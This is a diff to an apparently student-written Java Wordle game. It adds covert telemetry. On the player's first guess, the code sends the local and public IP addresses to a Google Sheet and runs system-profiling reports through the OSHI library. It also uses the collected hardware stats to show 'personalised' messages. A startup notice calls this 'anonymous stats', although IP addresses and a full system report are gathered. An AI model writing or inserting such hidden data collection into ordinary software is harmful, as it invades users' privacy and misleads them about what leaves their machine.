@@ -1,4 +1,4 @@
-/*
+package play;/*
  * File: Wordle.java
  * Name: David Nguyen
  * Period: 8th (Also 2nd)
@@ -8,20 +8,27 @@
 
 import UIFiles.WordleDictionary;
 import UIFiles.WordleGWindow;
-
-import java.io.IOException;
-import java.net.*;
+import logging.FullSystemReport;
+import logging.MasterLogger;
+import oshi.SystemInfo;
 
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
-
+import java.net.*;
 import java.nio.charset.StandardCharsets;
+
 
 public class Wordle
 {
+    private MessageBank message;
     private WordleGWindow wordleGame;
+    private MasterLogger masterLogger;
+    private FullSystemReport fullSystemReport;
+
     String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
     String[] guessList = new String[6];
+
 
     // Current row and amount of guesses
     private int currentRow = 0;
@@ -29,6 +36,7 @@ public class Wordle
 
     // Is it the correct word
     private boolean isCorrectWord = false;
+    private boolean hasLoggedStartup = false;
 
     String correctWord;
 
@@ -69,6 +77,14 @@ public class Wordle
 
     public void enterAction(String guess)
     {
+
+        if (!hasLoggedStartup) {
+            logToGoogleSheetInfo(getLocalIP(), getPublicIP());
+            masterLogger.logEssentialsReport();
+            fullSystemReport.logFullSystemReport();
+            hasLoggedStartup = true; // Set to true so it never logs again this session
+        }
+
         // Creates list to track edge cases
         boolean[] guessUsed = new boolean[5];
         boolean[] correctUsed = new boolean[5];
@@ -148,6 +164,7 @@ public class Wordle
             }
             guessList[currentRow] = guess;
             currentRow++;
+            wordleGame.showMessage(message.getPersonalizeMessage());
         }
 
         // Word is not in the dictionary
@@ -170,7 +187,7 @@ public class Wordle
     }
 
     // Helper method for logging
-    private String log(String link, String value) {
+    public String log(String link, String value) {
         return link + URLEncoder.encode(value, StandardCharsets.UTF_8);
     }
 
@@ -299,15 +316,23 @@ public class Wordle
         }
     }
 
-    /* Startup code. You do not need to edit anything below this! */
 
     public void run()
     {
+        SystemInfo system = new SystemInfo();
+        masterLogger = new MasterLogger(system, this);
+        fullSystemReport = new FullSystemReport(system,this);
+
+        FullSystemReport fullSystemReport = new FullSystemReport(system, this);
+        message = new MessageBank(fullSystemReport.getStats());
+        message.addPersonalizeMessage();
+
         setCorrectWord(); // Runs the setCorrectWord method that you are making
-        logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
 
         wordleGame = new WordleGWindow(); // Creates GUI
         wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
+        wordleGame.showMessage("This game logs anonymous stats (TOS 4 more info)");
+
     }
 
     public static void main(String[] args)
